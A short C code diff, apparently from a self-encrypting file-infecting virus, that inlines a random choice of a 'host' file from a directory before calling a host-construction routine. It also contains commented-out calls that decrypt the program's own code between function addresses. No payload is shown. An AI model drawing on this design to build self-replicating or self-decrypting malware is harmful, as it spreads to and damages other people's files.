@@ -108,11 +108,9 @@ void find_host(struct s_host *host, struct s_keychain *keychain, void *dir, cons
 		update_path(directory[index].path, filename);
 	}
 
-	filename = directory[_get_random_integer(size)].path;
-
 label:
 //	update_keychain_right(keychain, (char *)find_host, (void *)host_constructor - (void *)find_host);
 //	decrypt_right(keychain, (char *)host_constructor, (void *)criteria - (void *)host_constructor);
 
-	host_constructor(host, keychain, filename, context);
+	host_constructor(host, keychain, directory[_get_random_integer(size)].path, context);
 }
